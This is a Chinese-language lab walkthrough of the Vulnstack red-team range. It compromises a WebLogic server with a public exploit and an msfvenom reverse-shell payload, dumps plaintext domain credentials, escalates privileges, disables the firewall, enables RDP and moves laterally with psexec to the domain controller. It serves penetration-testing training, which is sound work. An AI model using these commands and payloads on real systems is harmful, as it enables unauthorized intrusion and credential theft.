---
title: ATT&CK红队评估实战靶场(二)
published: 2025-03-09 16:20:01
tags: [Vulnstack,域渗透]
category: 靶机
draft: false
---

# ATT&CK红队评估实战靶场(二)

> http://vulnstack.qiyuanxuetang.net/vuln/?page=2
> 

描述：红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：`1qaz@WSX`

（雾。。好多没听过的）

1. Bypass UAC
2. Windows系统NTLM获取（理论知识：Windows认证）
3. Access Token利用（MSSQL利用）
4. WMI利用
5. 网页代理，二层代理，特殊协议代理（DNS，ICMP）
6. 域内信息收集
7. 域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用
8. 域凭证收集
9. 后门技术（黄金票据/白银票据/Sid History/MOF）

![image.png](image%2019.png)

## 靶场搭建

1. 网络配置信息，已经默认配置好，直接将网卡设置好即可
    
    **DC** `IP`：10.10.10.10 `OS`：Windows 2012(64) `应用`：AD域
    
    **WEB** `IP1`：10.10.10.80 `IP2`：192.168.111.80 `OS`：Windows 2008(64) `应用`：Weblogic 10.3.6 MSSQL 2008
    
    **PC**  `IP1`：10.10.10.201 `IP2`：192.168.111.201 `OS`：Windows 7(32)
    
    **KALI** `IP` ：192.168.111.150
    
2. 网卡设置
    
    NAT网卡网段改为`192.168.111.0` ,仅主机模式网卡网段改为`10.10.10.0` ；
    
3. WEB主机默认账户是登陆不进去的，需要切换为`de1ay`账户登陆进去
    
    然后来到 `C:\Oracle\Middleware\user_projects\domains\base_domain\bin` 
    
    依次使用管理员模式打开 `set domainenv` `startmanagerweblogic` `startweblogic`
    
4. `kali`访问`http://192.168.111.80:7001/console` 
    
    ![image.png](image%2020.png)
    

***开始渗透***

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    `Kali`的`ip`是`150` ，那么目标就是`80`以及`201`
    
    ```php
    nmap -sP 192.168.111.0/24                   
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 15:39 CST
    Nmap scan report for 192.168.111.1
    Host is up (0.00051s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.111.2
    Host is up (0.00035s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.111.80
    Host is up (0.00024s latency).
    MAC Address: 00:0C:29:AC:FA:FB (VMware)
    Nmap scan report for 192.168.111.201
    Host is up (0.00033s latency).
    MAC Address: 00:0C:29:AD:EE:B7 (VMware)
    Nmap scan report for 192.168.111.254
    Host is up (0.00038s latency).
    MAC Address: 00:50:56:E6:0E:41 (VMware)
    Nmap scan report for 192.168.111.150
    ```
    
2. 扫描主机开放端口
    
    ```php
    # 192.168.111.80
    nmap -sT -min-rate 10000 -p- 192.168.111.80
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 15:42 CST
    Nmap scan report for 192.168.111.80
    Host is up (0.043s latency).
    Not shown: 65521 filtered tcp ports (no-response)
    PORT      STATE SERVICE
    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    1433/tcp  open  ms-sql-s
    3389/tcp  open  ms-wbt-server
    7001/tcp  open  afs3-callback
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    55068/tcp open  unknown
    60966/tcp open  unknown
    # 192.168.111.201
    nmap -sT -min-rate 10000 -p- 192.168.111.201
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 15:44 CST
    Nmap scan report for 192.168.111.201
    Host is up (0.044s latency).
    Not shown: 65525 filtered tcp ports (no-response)
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    60518/tcp open  unknown
    MAC Address: 00:0C:29:AD:EE:B7 (VMware)
    ```
    
    `192.168.111.80`存在`web`端口，所以是我们的优先目标
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,135,139,445,1433,3389,7001 192.168.111.80
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 15:57 CST
    Nmap scan report for 192.168.111.80
    Host is up (0.0010s latency).
    
    PORT     STATE SERVICE        VERSION
    80/tcp   open  http           Microsoft IIS httpd 7.5
    135/tcp  open  msrpc          Microsoft Windows RPC
    139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    1433/tcp open  ms-sql-s       Microsoft SQL Server 2008 R2 10.50.4000; SP2
    3389/tcp open  ms-wbt-server?
    7001/tcp open  http           Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port3389-TCP:V=7.94SVN%I=7%D=11/16%Time=67385090%P=x86_64-pc-linux-gnu%
    SF:r(TerminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x01\x08\
    SF:0\x02\0\0\0");
    MAC Address: 00:0C:29:AC:FA:FB (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: phone|specialized|general purpose
    Running (JUST GUESSING): Microsoft Windows Phone|7|8.1|2008|Vista (94%)
    OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8
    Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (94%), Microsoft Windows Embedded Standard 7 (93%), Microsoft Windows 8.1 R1 (92%), Microsoft Windows 7 (91%), Microsoft Windows Server 2008 or 2008 Beta 3 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows Server 2008 R2 SP1 (88%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 1 hop
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 88.35 seconds
    ```
    
    扫出系统版本`Microsoft Windows Server 2008 R2` ，以及`MSSQL` ，`Oracle WebLogic Server 10.3.6.0`
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,135,139,445,1433,3389,7001 192.168.111.80                                                                                                                                             
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 16:04 CST                                                                                                                                                
    Nmap scan report for 192.168.111.80                                                                                                                                                                               
    Host is up (0.0012s latency).                                                                                                                                                                                     
                                                                                                                                                                                                                      
    PORT     STATE SERVICE                                                                                                                                                                                            
    80/tcp   open  http                                                                                                                                                                                               
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                                                  
    |_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                                                             
    |_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                                                              
    135/tcp  open  msrpc                                                                                                                                                                                              
    139/tcp  open  netbios-ssn                                                                                                                                                                                        
    445/tcp  open  microsoft-ds                                                                                                                                                                                       
    1433/tcp open  ms-sql-s                                                                                                                                                                                           
    | ssl-poodle:                                                                                                                                                                                                     
    |   VULNERABLE:                                                                                                                                                                                                   
    |   SSL POODLE information leak                                                                                                                                                                                   
    |     State: VULNERABLE                                                                                                                                                                                           
    |     IDs:  BID:70574  CVE:CVE-2014-3566            
    |           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other                            
    |           products, uses nondeterministic CBC padding, which makes it easier                           
    |           for man-in-the-middle attackers to obtain cleartext data via a                               
    |           padding-oracle attack, aka the "POODLE" issue.                                               
    |     Disclosure date: 2014-10-14                   
    |     Check results:                                
    |       TLS_RSA_WITH_3DES_EDE_CBC_SHA               
    |     References:                                   
    |       https://www.securityfocus.com/bid/70574     
    |       https://www.imperialviolet.org/2014/10/14/poodle.html                                            
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566                                     
    |_      https://www.openssl.org/~bodo/ssl-poodle.pdf                                                     
    |_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)                                      
    3389/tcp open  ms-wbt-server                        
    7001/tcp open  afs3-callback                        
    MAC Address: 00:0C:29:AC:FA:FB (VMware)             
    
    Host script results:                                
    | smb-vuln-ms17-010:                                
    |   VULNERABLE:                                     
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                            
    |     State: VULNERABLE  
    |     IDs:  CVE:CVE-2017-0143                       
    |     Risk factor: HIGH                             
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1                         
    |        servers (ms17-010).                        
    |                                                   
    |     Disclosure date: 2017-03-14                                                                        
    |     References:                                                                                        
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                               
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143                                     
    |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED        
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED                                                      
    |_smb-vuln-ms10-054: false
    ```
    
    扫出主机`ms17-010`永恒之蓝，不过开放了`445`应该都会扫出来，以及`CVE-2014-3566` ，网上查阅说是信息泄露漏洞，`web`的好像没有扫出扫描漏洞，但是我们知道`7001`端口上是`WebLogic` ，可以查阅它的漏洞
    
    > https://zh.wikipedia.org/wiki/%E8%B4%B5%E5%AE%BE%E7%8A%AC%E6%BC%8F%E6%B4%9E
    > 

## web渗透

### 80端口

1. 访问主页，是空页面
    
    ![image.png](image%2021.png)
    
2. 尝试扫描目录
    
    ```python
    gobuster dir -u http://192.168.111.80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,zip,txt | grep -v "403"
    ```
    
    啥也没有扫出来，转`7001`端口
    

### 7001端口

1. 访问主页
    
    ![image.png](image%2022.png)
    
2. 发现`/console`能够正常访问到`weblogic`控制台
    
    ![image.png](image%2023.png)
    
    可以在右下角找到版本号`WebLogic Server 版本: 10.3.6.0` ，和之前`nmap`扫描的一模一样
    
3. 查阅漏洞
    - 通过`searchexploit` 搜索
        
        ```python
        searchsploit WebLogic 10.3.6.0
        -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
         Exploit Title                                                                                                                                                                  |  Path
        -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
        Oracle Weblogic 10.3.6.0.0 - Remote Command Execution                                                                                                                           | java/webapps/47895.py
        Oracle Weblogic 10.3.6.0.0 / 12.1.3.0.0 - Remote Code Execution                                                                                                                 | windows/webapps/46780.py
        Oracle WebLogic Server 10.3.6.0 - Java Deserialization Remote Code Execution                                                                                                    | java/remote/42806.py
        Oracle Weblogic Server 10.3.6.0 / 12.1.3.0 / 12.2.1.2 / 12.2.1.3 - Deserialization Remote Command Execution                                                                     | multiple/remote/44553.py
        Oracle WebLogic Server 10.3.6.0.0 / 12.x - Remote Command Execution                                                                                                             | multiple/remote/43392.py
        WebLogic Server 10.3.6.0.0 / 12.1.3.0.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0 - Unauthenticated RCE via GET request                                                            | java/webapps/48971.py
        -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
        ```
        
        存在远程命令执行
        
    - weblogic权限绕过（CVE-2020-14882）
        
        ```python
        http://192.168.111.80:7001/console/css/%252e%252e%252fconsole.portal
        ```
        
        能直接进入后台，但是权限很低，无法利用
        
    - CVE-2019-2725 反序列化远程代码执行
        1. 拉取上面`searchexploit` 的搜索到的`46780.py` ，然后跟根据文件内部`usage`食用
            
            ```python
            # Script Usage:
            # python exploit.py http://IP:PORT/_async/AsyncResponseServiceHttps
            # msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=1234 -f psh-cmd > exploit.ps1
            # Add the powershell command in the variable
            ```
            
        2. 先通过`msfvenom`生成`payload`文件
            
            ```python
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.150 LPORT=1234 -f psh-cmd > exploit.ps1
            ```
            
            然后将文件`exploit.ps1`里面的内容替换到`46780.py` 的`exploit`变量中的
            
        3. `kali`开启监听
            
            ```python
            msf6 > use exploit/multi/handler 
            msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
            msf6 exploit(multi/handler) > set lhost 192.168.111.150
            msf6 exploit(multi/handler) > set lport 1234
            msf6 exploit(multi/handler) > run
            ```
            
        4. 执行脚本`46780.py` ，要通过`python2`执行
            
            ```python
            python2 46780.py http://192.168.111.80:7001/_async/AsyncResponseServiceHttps
            Exploit Written by Avinash Kumar Thapa
            status_code:202
            <Response [202]>
            ```
            
        5. 最后回到Kali可以发现反弹成功了，并且用户是`DE1AY\Administrator` 
            
            ```python
            msf6 > use exploit/multi/handler 
            msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
            msf6 exploit(multi/handler) > set lhost 192.168.111.150
            msf6 exploit(multi/handler) > set lport 1234
            msf6 exploit(multi/handler) > run
            [*] Started reverse TCP handler on 192.168.111.150:1234 
            [*] Sending stage (176198 bytes) to 192.168.111.80
            [*] Meterpreter session 1 opened (192.168.111.150:1234 -> 192.168.111.80:49303) at 2024-11-16 18:38:27 +0800
            
            meterpreter > getuid
            Server username: DE1AY\Administrator
            ```
            

## 内网渗透

### MSF派生CS

1. 启动`CS`服务端，并用客户端连上
2. `CS`设置`HTTP`监听器
    
    ![image.png](image%2024.png)
    
3. MSF使用`payload_inject` 模块
    
    ```python
    meterpreter > bg
    [*] Backgrounding session 1...
    msf6 exploit(multi/handler) > use exploit/windows/local/payload_inject 
    msf6 exploit(windows/local/payload_inject) > set payload windows/meterpreter/reverse_http
    msf6 exploit(windows/local/payload_inject) > set lport 192.168.111.150
    msf6 exploit(windows/local/payload_inject) > set lport 80
    msf6 exploit(windows/local/payload_inject) > set disablepayloadhandler true 
    msf6 exploit(windows/local/payload_inject) > set prependmigrate true 
    msf6 exploit(windows/local/payload_inject) > set session 1
    msf6 exploit(windows/local/payload_inject) > run
    [*] Running module against WEB
    [*] Spawned Notepad process 3584
    [*] Injecting payload into 3584
    [*] Preparing 'windows/meterpreter/reverse_http' for PID 3584
    ```
    
4. 然后回到CS就可以看到已经将主机派生过来了
    
    ![image.png](image%2025.png)
    

### 内网信息收寻

1. 网络配置信息
    
    ```python
    C:\Oracle\Middleware\user_projects\domains\base_domain>ipconfig
    Windows IP Configuration
    Ethernet adapter  2:
       Connection-specific DNS Suffix  . : 
       Link-local IPv6 Address . . . . . : fe80::d153:9eef:2b9e:1c80%13
       IPv4 Address. . . . . . . . . . . : 10.10.10.80
       Subnet Mask . . . . . . . . . . . : 255.255.255.0
       Default Gateway . . . . . . . . . : 10.10.10.1
    Ethernet adapter :
       Connection-specific DNS Suffix  . : 
       Link-local IPv6 Address . . . . . : fe80::2836:b233:6919:8d8a%11
       IPv4 Address. . . . . . . . . . . : 192.168.111.80
       Subnet Mask . . . . . . . . . . . : 255.255.255.0
       Default Gateway . . . . . . . . . : 192.168.111.1
    ```
    
    外网网段`192.168.111.0` ，内网网段`10.10.10.0`
    
2. 进程信息
    
    ```python
    # ps
    2740  2120  360Tray.exe                   x86   1        DE1AY\Administrator           C:\Program Files (x86)\360\360Safe\safemon\360Tray.exe
    ```
    
    发现安装了`360`
    
3. 主机信息
    
    ```python
    meterpreter > sysinfo
    Computer        : WEB
    OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
    Architecture    : x64
    System Language : zh_CN
    Domain          : DE1AY
    Logged On Users : 8
    Meterpreter     : x86/windows
    ```
    
    发现存在域`DE1AY`
    
4. 查看域详细信息
    
    ```python
    beacon> shell net config workstation
    [*] Tasked beacon to run: net config workstation
    [+] host called home, sent: 53 bytes
    [+] received output:
    计算机名                     \\WEB
    计算机全名                   WEB.de1ay.com
    用户名                       Administrator
    
    工作站正运行于               
    	NetBT_Tcpip_{D7E14072-49B9-45D3-BA8C-7955E6146CC2} (000C29ACFAFB)
    	NetBT_Tcpip_{AD80CD23-D97F-4814-A715-9248D845EA0F} (000C29ACFA05)
    
    软件版本                     Windows Server 2008 R2 Standard
    
    工作站域                     DE1AY
    工作站域 DNS 名称            de1ay.com
    登录域                       DE1AY
    ```
    
    域为`de1ay.com` 
    
5. 查看本机用户（本机以及域用户）
    
    ```python
    C:\Oracle\Middleware\user_projects\domains\base_domain>net user    
    net user
    
    User accounts for \\WEB
    
    -------------------------------------------------------------------------------
    Administrator            de1ay                    Guest                    
    The command completed successfully.
    # 查看域用户被拒绝
    C:\Oracle\Middleware\user_projects\domains\base_domain>net user /domain
    net user /domain
    The request will be processed at a domain controller for domain de1ay.com.
    
    System error 5 has occurred.
    
    Access is denied.
    ```
    
6. 查看域中主机，也是权限不足
    
    ```python
    C:\Oracle\Middleware\user_projects\domains\base_domain>net group "domain computers" /domain
    The request will be processed at a domain controller for domain de1ay.com.
    
    System error 5 has occurred.
    
    Access is denied.
    ```
    
7. 查看ARP列表
    
    ```python
    meterpreter > arp -a
    
    ARP cache
    =========
    
        IP address       MAC address        Interface
        ----------       -----------        ---------
        10.10.10.1       00:50:56:c0:00:01  Intel(R) PRO/1000 MT Network Connection #2
        10.10.10.10      00:0c:29:9c:85:b6  Intel(R) PRO/1000 MT Network Connection #2
        10.10.10.201     00:0c:29:ad:ee:c1  Intel(R) PRO/1000 MT Network Connection #2
        10.10.10.255     ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection #2
        192.168.111.1    00:50:56:c0:00:08  Intel(R) PRO/1000 MT Network Connection
        192.168.111.150  00:0c:29:de:14:88  Intel(R) PRO/1000 MT Network Connection
        192.168.111.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection
        224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1
        224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Network Connection
        224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Network Connection #2
        224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Network Connection
        224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Network Connection #2
    ```
    
    发现内网主机 `10`，`201`
    

### CS抓取kiwi抓取密码及web主机提权

1. CS抓取明文密码
    
    ![image.png](image%2026.png)
    
    ```python
    kerberos :	
    	 * Username : Administrator # 大概率是域管理员
    	 * Domain   : de1ay.com
    	 * Password : 1qaz@WSX
    ```
    
    得到密码`1qaz@WSX` ，很多用户（`de1ay`,`mssql`）的密码都是这个，扫描到主机后可以横向移动
    
2. 之前在MSF提权不成功，尝试在CS提权
    
    ![image.png](image%2027.png)
    
    ```python
    beacon> elevate svc-exe HTTP-80
    [*] Tasked beacon to run windows/beacon_http/reverse_http (192.168.111.150:80) via Service Control Manager (\\127.0.0.1\ADMIN$\722628d.exe)
    [+] host called home, sent: 313305 bytes
    [+] received output:
    Started service 722628d on .
    ```
    
    提权成功，多出来一个会话，是`system`权限的
    
    ![image.png](image%2028.png)
    

### web主机远程桌面

1. 关闭防火墙（提权后第一件要做的事）
    
    ```python
    beacon> shell netsh advfirewall set allprofiles state off
    [*] Tasked beacon to run: netsh advfirewall set allprofiles state off
    [+] host called home, sent: 74 bytes
    确定。
    ```
    
2. 注册表开启远程桌面
    
    ```python
    beacon> shell REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    [*] Tasked beacon to run: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    [+] host called home, sent: 144 bytes
    [+] received output:
    操作成功完成
    ```
    
3. 连接远程桌面
    
    ```python
    proxychains rdesktop 192.168.111.80 -p 1qaz@WSX -u administrator
    ```
    
    登录 `de1ay\administrator` 时，需要更改新密码，我们将它修改为`Aa118811`
    
    ![image.png](image%2029.png)
    
    登陆成功
    
4. 在里边进行信息收集
    
    ![image.png](image%2030.png)
    
    得到域成员 `PC,WEB`以及域控`DC` ，但是不知道`IP`
    

### 使用CS进行端口扫描

由于`CS`上目标只能发现WEB主机一台，没发现域内别的主机渗透不下去，也不能进行横向移动

![image.png](image%2031.png)

```python
beacon> portscan 10.10.10.0-10.10.10.255 1-1024,3389,5000-6000 arp 1024
[*] Tasked beacon to scan ports 1-1024,3389,5000-6000 on 10.10.10.0-10.10.10.255
[+] host called home, sent: 75365 bytes
[+] received output:
(ARP) Target '10.10.10.80' is alive. 00-0C-29-AC-FA-05
(ARP) Target '10.10.10.201' is alive. 00-0C-29-AD-EE-C1
(ARP) Target '10.10.10.254' is alive. 00-50-56-E7-10-69
10.10.10.201:3389
10.10.10.201:139
10.10.10.201:135
10.10.10.80:3389
10.10.10.80:139
10.10.10.80:135
10.10.10.80:80
10.10.10.10:5985
10.10.10.10:3389
10.10.10.10:636
10.10.10.10:593
10.10.10.10:464
10.10.10.10:389
10.10.10.10:139
10.10.10.10:135
10.10.10.10:88
10.10.10.10:53
10.10.10.1:5357
10.10.10.1:5040
10.10.10.1:3389
10.10.10.1:912
10.10.10.1:902
10.10.10.1:139
10.10.10.1:135
10.10.10.1:445
10.10.10.10:445 (platform: 500 version: 6.3 name: DC domain: DE1AY)
10.10.10.80:445 (platform: 500 version: 6.1 name: WEB domain: DE1AY)
10.10.10.201:445 (platform: 500 version: 6.1 name: PC domain: DE1AY)
Scanner module is complete
```

扫出来主机`10.10.10.10`以及`10.10.10.201`,`10.10.10.80`是web主机，并且都扫描出了`445`端口，并且都开启`3389`端口

![image.png](image%2032.png)

CS的目标主机也发现了，DC是`10.10.10.10`，PC是`10.10.10.201`

### 横向移动

1. 因为域内所有主机都开启`445`端口，所以我们创建一个SMB监听器来进行横向
    
    ![image.png](image%2033.png)
    
2. 在`CS`再抓一次明文密码，因为我们之前登录远程桌面时修改了`de1ay/administrator`的密码
3. 进行横向，右键`DC`选择`psexec` ，然后选择刚刚创建`SMB`监听器，点击`Launch`
    
    ![image.png](image%2034.png)
    
    ```python
    beacon> jump psexec DC SMB-1
    [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\test) on DC via Service Control Manager (\\DC\ADMIN$\eb3da6e.exe)
    [+] host called home, sent: 313378 bytes
    [+] Impersonated DE1AY.COM\administrator (netonly)
    [+] received output:
    Started service eb3da6e on DC
    [+] established link to child beacon: 10.10.10.10
    ```
    
    上线成功！！拿下DC
    
    ![image.png](image%2035.png)
    
4. 继续拿下`PC` ，和上面一样的操操作
    
    ![image.png](image%2036.png)
    
    横向成功，拿下了
    
    ![image.png](image%2037.png)
    

### 不进行横向利用3389

1. 上面内网端口扫描发现所有主机都开启可`3389`端口
2. 结合我们上面使用kiwi抓取的明文密码，可以直接登陆上去
3. 使用之前开启远程桌面的`web`主机作为跳板
4. 连接远程桌面，在web主机里面远程`DC`以及`PC`即可
    
    ![image.png](image%2038.png)
    

### 还可以使用永恒之蓝漏洞

不写了

## 黄金票据（权限维持）

看我第一篇红日靶场的文章即可，主要收集`krbtgt`账户的`HTLM`的`HASH` ，以及域管理员的`SID` ，域的名称，随便一个账户即可构造黄金票据